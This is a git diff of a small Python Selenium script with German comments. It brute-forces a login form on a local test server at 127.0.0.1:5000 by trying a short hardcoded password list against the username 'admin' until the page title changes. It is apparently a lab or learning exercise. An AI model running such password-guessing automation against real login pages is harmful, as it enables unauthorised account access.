@@ -15,33 +15,36 @@ website = "http://127.0.0.1:5000/login"
 
 driver.get(website)
 
-# wordlist verwenden
-passwords = ["sdf", "hksda", "db", "de"]
+# wordlist verwenden - da hardware hier sehr begrenzt, wird wordlist mit array simuliert 
+passwords = ["1234", "password", "de", "password2026", "admin"]
+username = "admin"
 for passw in passwords:
     driver.get(website)
-    time.sleep(10)
-    print(f"Trying {passw}")
+    time.sleep(5)
+    print("=======================")
+    print(f"Trying Password: {passw}")
 
     res = driver.find_elements(By.CLASS_NAME, "form-control")
 
     print(f"Check {len(res)}")
 
-    time.sleep(10)
+    time.sleep(5)
     
-    res[0].clear()
-    res[0].send_keys("de")
+    #res[0].clear()
+    res[0].send_keys(username) # username hier eingeben
 
-    res[1].clear()
+    #res[1].clear()
     res[1].send_keys(passw)
 
     button = driver.find_elements(By.CLASS_NAME, "btn")
-    print(f"Check2 {len(button)}")
+    print(f"Check 2 {len(button)}")
 
     button[0].click()
 
-    print(f"Title of this page is: {driver.title}")
+    print(f"Pagetitel: {driver.title}, try next Password...")
     if driver.title != "Login":
         print(f"Password found: {passw}")
+        print(f"Username: {username}")
         break
 
 driver.quit()
